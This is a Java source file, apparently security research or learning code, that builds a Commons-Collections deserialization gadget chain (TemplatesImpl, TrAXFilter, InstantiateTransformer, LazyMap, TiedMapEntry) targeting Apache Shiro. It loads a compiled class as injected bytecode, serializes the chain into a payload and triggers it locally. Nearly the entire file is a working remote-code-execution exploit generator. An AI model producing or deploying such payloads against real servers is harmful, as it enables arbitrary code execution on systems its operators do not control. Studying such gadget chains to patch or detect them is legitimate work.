package org.example.gadget.shiro;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class ShiroCC61 {
    public static void main(String[] args) throws Exception {
        Object expMap = new ShiroCC61().getObject();
        // ==================
        // ⽣成序列化字符串
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(expMap);
        oos.close();
        // 本地测试触发
        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new
                ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
    public static void setFieldValue(Object obj, String fieldName, Object
            value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static String classFileToBase64(String filepath) throws IOException {
        String classFilePath = filepath;
        String base64String;
        // 读取 class 文件的字节数组
        byte[] classBytes = Files.readAllBytes(Paths.get(classFilePath));

        // 将字节数组转换为 Base64 编码字符串
        base64String= Base64.getEncoder().encodeToString(classBytes);

        return base64String;
    }
    public Object getObject() throws Exception {
        String base64Code = classFileToBase64("C:\\Users\\tlj\\Desktop\\tmp\\java8u66\\CalcExample.class");
        byte[] code =
                Base64.getDecoder().decode(base64Code);
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][] {code});
        setFieldValue(obj, "_name", "CalcExample");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        Transformer transformer = new InstantiateTransformer(
                new Class[] { Templates.class },
                new Object[] { obj });
        Transformer faketransformer = new ConstantTransformer("fakeTransformer");

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, faketransformer);

        TiedMapEntry tme = new TiedMapEntry(outerMap, TrAXFilter.class);
        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");

        outerMap.clear();

        //setFieldValue(transformer, "iParamTypes", new Class[] { Templates.class });
        //setFieldValue(transformer, "iArgs", new Object[] { obj });
        setFieldValue(outerMap, "factory", transformer);
        return expMap;
    }
}
